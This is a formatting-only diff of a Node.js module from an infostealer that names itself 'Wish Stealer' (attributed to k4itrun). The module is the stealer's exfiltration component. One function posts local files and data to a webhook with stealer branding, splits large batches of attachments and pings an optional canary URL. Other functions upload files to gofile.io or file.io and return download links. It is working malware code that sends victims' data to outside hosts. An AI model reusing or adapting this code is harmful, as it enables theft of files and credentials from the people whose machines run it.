@@ -1,168 +1,168 @@
-const fs = require('fs');
-const axios = require('axios');
-const FormData = require('form-data');
+const fs = require("fs");
+const axios = require("axios");
+const FormData = require("form-data");
 
 const MAX_FILE_SIZE_MB = 8;
 const MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024;
 
 const Webhook = async (webhookUrl, data, files = [], canary) => {
-  const form = new FormData();
-  let fileCount = 0;
+ const form = new FormData();
+ let fileCount = 0;
 
-  for (const file of files) {
-    const fileSize = fs.statSync(file).size;
+ for (const file of files) {
+  const fileSize = fs.statSync(file).size;
 
-    if (fileSize > MAX_FILE_SIZE_BYTES) {
-      continue;
-    }
-
-    const fileStream = fs.createReadStream(file);
-    form.append(`file[${fileCount}]`, fileStream, { filename: file });
-    fileCount++;
+  if (fileSize > MAX_FILE_SIZE_BYTES) {
+   continue;
   }
 
-  if (fileCount > 10) {
-    await Webhook(webhookUrl, data);
-    for (let i = 0; i < fileCount; i++) {
-      await Webhook(
-        webhookUrl,
-        {
-          ...data,
-          content: `Attachment ${i + 1}: \`${files[i]}\``,
-        },
-        [files[i]]
-      );
-    }
-    return;
+  const fileStream = fs.createReadStream(file);
+  form.append(`file[${fileCount}]`, fileStream, { filename: file });
+  fileCount++;
+ }
+
+ if (fileCount > 10) {
+  await Webhook(webhookUrl, data);
+  for (let i = 0; i < fileCount; i++) {
+   await Webhook(
+    webhookUrl,
+    {
+     ...data,
+     content: `Attachment ${i + 1}: \`${files[i]}\``,
+    },
+    [files[i]],
+   );
   }
+  return;
+ }
 
-  data.username = 'Wish Stealer';
-  data.avatar_url = 'https://avatars.githubusercontent.com/u/181030699';
+ data.username = "Wish Stealer";
+ data.avatar_url = "https://avatars.githubusercontent.com/u/181030699";
 
-  if (data.embeds) {
-    for (const embed of data.embeds) {
-      embed.color = parseInt('ab3cf5', 16);
-      embed.footer = {
-        text: 'github.com/k4itrun/Wish - made by k4itrun',
-        icon_url: 'https://avatars.githubusercontent.com/u/103044629',
-      };
-      embed.timestamp = new Date();
-    }
+ if (data.embeds) {
+  for (const embed of data.embeds) {
+   embed.color = parseInt("ab3cf5", 16);
+   embed.footer = {
+    text: "github.com/k4itrun/Wish - made by k4itrun",
+    icon_url: "https://avatars.githubusercontent.com/u/103044629",
+   };
+   embed.timestamp = new Date();
   }
+ }
 
-  form.append('payload_json', JSON.stringify(data));
+ form.append("payload_json", JSON.stringify(data));
 
-  try {
-    await axios.post(webhookUrl, form, {
-      headers: {
-        ...form.getHeaders(),
-      },
-    });
-    if (canary) {
-      await axios.get(canary);
-    }
-  } catch (error) {
-    console.error('Error sending webhook:', error);
+ try {
+  await axios.post(webhookUrl, form, {
+   headers: {
+    ...form.getHeaders(),
+   },
+  });
+  if (canary) {
+   await axios.get(canary);
   }
+ } catch (error) {
+  console.error("Error sending webhook:", error);
+ }
 };
 
 const ServerGofile = async () => {
-  try {
-    const response = await axios.get(
-      'https://api.gofile.io/servers',
-      {},
-      {
-        headers: {
-          referrer: 'https://gofile.io/uploadFiles',
-          'accept-language': 'en-US,en;',
-          'cache-control': 'no-cache',
-          'user-agent': 'Mozilla/5.0',
-          origin: 'https://gofile.io',
-          pragma: 'no-cache',
-          accept: '*/*',
-          mode: 'cors',
-          dnt: 1,
-        },
-      }
-    );
-    if (response.data.status !== 'ok') return null;
-    const servers = response.data.data.servers;
+ try {
+  const response = await axios.get(
+   "https://api.gofile.io/servers",
+   {},
+   {
+    headers: {
+     referrer: "https://gofile.io/uploadFiles",
+     "accept-language": "en-US,en;",
+     "cache-control": "no-cache",
+     "user-agent": "Mozilla/5.0",
+     origin: "https://gofile.io",
+     pragma: "no-cache",
+     accept: "*/*",
+     mode: "cors",
+     dnt: 1,
+    },
+   },
+  );
+  if (response.data.status !== "ok") return null;
+  const servers = response.data.data.servers;
 
-    return servers[Math.floor(Math.random() * servers.length)].name;
-  } catch (_error) {
-    return null;
-  }
+  return servers[Math.floor(Math.random() * servers.length)].name;
+ } catch (_error) {
+  return null;
+ }
 };
 
 const UploadGofile = async (filePath, server) => {
-  const form = new FormData();
+ const form = new FormData();
 
-  form.append('file', fs.createReadStream(filePath));
+ form.append("file", fs.createReadStream(filePath));
 
-  try {
-    const response = await axios.post(`https://${server}.gofile.io/contents/uploadfile`, form, {
-      headers: {
-        referrer: 'https://gofile.io/uploadFiles',
-        'accept-language': 'en-US,en;',
-        'cache-control': 'no-cache',
-        'user-agent': 'Mozilla/5.0',
-        origin: 'https://gofile.io',
-        pragma: 'no-cache',
-        accept: '*/*',
-        mode: 'cors',
-        dnt: 1,
-        ...form.getHeaders(),
-      },
-      maxContentLength: Infinity,
-      maxBodyLength: Infinity,
-    });
+ try {
+  const response = await axios.post(`https://${server}.gofile.io/contents/uploadfile`, form, {
+   headers: {
+    referrer: "https://gofile.io/uploadFiles",
+    "accept-language": "en-US,en;",
+    "cache-control": "no-cache",
+    "user-agent": "Mozilla/5.0",
+    origin: "https://gofile.io",
+    pragma: "no-cache",
+    accept: "*/*",
+    mode: "cors",
+    dnt: 1,
+    ...form.getHeaders(),
+   },
+   maxContentLength: Infinity,
+   maxBodyLength: Infinity,
+  });
 
-    return response.data.data.downloadPage || null;
-  } catch (_error) {
-    return null;
-  }
+  return response.data.data.downloadPage || null;
+ } catch (_error) {
+  return null;
+ }
 };
 
 const UploadFileio = async (filePath) => {
-  const form = new FormData();
+ const form = new FormData();
 
-  form.append('file', fs.createReadStream(filePath));
-  form.append('maxdownloads', '30');
+ form.append("file", fs.createReadStream(filePath));
+ form.append("maxdownloads", "30");
 
-  try {
-    const response = await axios.post('https://file.io/', form, {
-      headers: {
-        ...form.getHeaders(),
-      },
-    });
+ try {
+  const response = await axios.post("https://file.io/", form, {
+   headers: {
+    ...form.getHeaders(),
+   },
+  });
 
-    return response.data.link || null;
-  } catch (_error) {
-    return null;
-  }
+  return response.data.link || null;
+ } catch (_error) {
+  return null;
+ }
 };
 
 const Upload = async (filePath) => {
-  let link = null;
+ let link = null;
 
-  try {
-    const server = await ServerGofile();
-    if (server) {
-      link = await UploadGofile(filePath, server);
-    }
-
-    if (!link) {
-      link = await UploadFileio(filePath);
-    }
-
-    return link;
-  } catch (error) {
-    console.error('Error uploading file:', error);
-    return null;
+ try {
+  const server = await ServerGofile();
+  if (server) {
+   link = await UploadGofile(filePath, server);
   }
+
+  if (!link) {
+   link = await UploadFileio(filePath);
+  }
+
+  return link;
+ } catch (error) {
+  console.error("Error uploading file:", error);
+  return null;
+ }
 };
 
 module.exports = {
-  Webhook,
-  Upload,
+ Webhook,
+ Upload,
 };
